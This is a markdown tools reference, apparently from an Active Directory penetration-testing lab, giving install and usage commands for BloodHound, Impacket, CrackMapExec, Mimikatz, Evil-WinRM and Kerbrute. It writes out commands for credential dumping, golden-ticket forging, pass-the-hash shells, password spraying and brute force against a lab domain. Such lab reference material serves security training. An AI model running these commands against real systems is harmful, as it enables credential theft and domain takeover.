# 🛠️ Tools Reference

A curated list of tools used throughout this project with installation and quick-start commands.

---

## 🔵 BloodHound

```bash
# Install
sudo apt install bloodhound
pip3 install bloodhound

# Start Neo4j database
sudo neo4j console

# Run BloodHound GUI
bloodhound

# Collect data remotely
python3 bloodhound.py -d corp.local -u jsmith -p 'Password123!' -c All -ns 192.168.56.10
```

---

## 🔴 Impacket Suite

```bash
# Install
pip3 install impacket
# OR
sudo apt install impacket-scripts

# Key scripts:
# GetNPUsers.py   → AS-REP Roasting
# GetUserSPNs.py  → Kerberoasting
# secretsdump.py  → Credential dumping
# psexec.py       → Remote shell (SMB)
# wmiexec.py      → Remote shell (WMI)
# ticketer.py     → Golden/Silver ticket creation
```

---

## 🟡 CrackMapExec (CME)

```bash
# Install
pipx install crackmapexec

# Quick examples
cme smb 192.168.56.0/24                          # Host discovery
cme smb 192.168.56.10 -u jsmith -p Password123!  # Auth test
cme smb 192.168.56.10 -u jsmith -p Password123! --shares  # List shares
cme winrm 192.168.56.10 -u jsmith -p Password123!  # WinRM check
```

---

## 🟠 Mimikatz

```powershell
# Must run as Administrator
privilege::debug

# Dump plaintext passwords
sekurlsa::logonpasswords

# Kerberos ticket operations
kerberos::list
kerberos::ptt ticket.kirbi

# Golden Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:<SID> /krbtgt:<HASH> /id:500
```

---

## 🟢 Evil-WinRM

```bash
# Install
gem install evil-winrm

# Connect with password
evil-winrm -i 192.168.56.10 -u adm-user -p 'Admin@2024!'

# Connect with hash (PtH)
evil-winrm -i 192.168.56.10 -u adm-user -H <NT_HASH>

# Upload/download files
upload /local/file.exe
download C:\\Windows\\file.txt
```

---

## 🔵 Kerbrute

```bash
# Download
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute

# User enumeration
./kerbrute userenum -d corp.local --dc 192.168.56.10 usernames.txt

# Password spray
./kerbrute passwordspray -d corp.local --dc 192.168.56.10 users.txt 'Password123!'

# Brute force single user
./kerbrute bruteuser -d corp.local --dc 192.168.56.10 rockyou.txt jsmith
```
